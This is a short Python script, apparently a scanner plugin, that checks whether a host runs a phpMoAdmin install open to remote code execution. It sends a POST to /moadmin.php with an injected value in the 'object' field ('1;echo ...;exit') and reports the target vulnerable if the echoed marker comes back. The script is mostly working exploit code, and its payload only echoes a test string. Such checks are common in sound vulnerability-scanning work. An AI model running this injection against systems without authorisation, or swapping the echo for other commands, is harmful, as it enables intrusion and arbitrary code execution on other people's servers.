# -*- coding:utf-8 -*-

import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)+'/moadmin.php'
    print('testing if phpmoadmin rce vul')
    data = {'object':"1;echo 'vulnerable';exit"}
    try:
        req = requests.post(url,data=data,verify=False,timeout=10)
        if req.status_code==200 and 'vulnerable' in req.text:
            msg = 'There is phpmoadmin rce vul on url: ' +url+ ' .'
            number = 'v24'
            print(msg)
            return True,url,number,msg
        else:
            msg = 'There is no phpmoadmin rce vul on ' +url+ ' .'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg







